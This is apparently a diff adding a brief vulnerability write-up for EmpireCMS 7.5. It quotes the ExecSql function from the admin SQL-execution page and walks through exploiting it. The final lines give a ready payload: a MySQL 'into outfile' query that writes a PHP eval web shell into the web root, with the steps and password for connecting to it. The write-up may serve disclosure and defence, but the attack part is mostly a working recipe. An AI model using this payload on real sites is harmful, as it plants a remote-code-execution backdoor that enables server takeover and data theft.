@@ -1,0 +1,25 @@
+Dwonload the EmpireCMS 7.5,open file :\e\admin\db\DoSql.php,look at the code:
+line143 Sql carried out:
+-------------------code------------------------------
+function ExecSql($id,$userid,$username){
+	global $empire,$dbtbpre;
+	$id=(int)$id;
+	if(empty($id))
+	{
+		printerror('EmptyExecSqlid','');
+	}
+	$r=$empire->fetch1("select sqltext from {$dbtbpre}enewssql where id='$id'");
+	if(!$r['sqltext'])
+	{
+		printerror('EmptyExecSqlid','');
+    }
+	$query=RepSqlTbpre($r['sqltext']);
+	DoRunQuery($query);
+-------------------code end------------------------------
+Verification userid,username,then direct query.
+------Use-------
+Installation EmpireCMS 7.5, at backstage management - SQL execution,Insert attack command:
+Url:http://127.0.0.2:8080/e/admin/admin.php?ehash_ZggST=fK6I2xSKLEmuO6qZXF9A
+Use MYSQL 'into outfile' tenerate PHP trojan.
+Payload:select '<?php @eval($_POST[1])?>' into outfile 'D:/wwwroot/diguocms/1.php'
+Execution succeed,connect PHP trojan http://127.0.0.1:8080/1.php,password is 1.
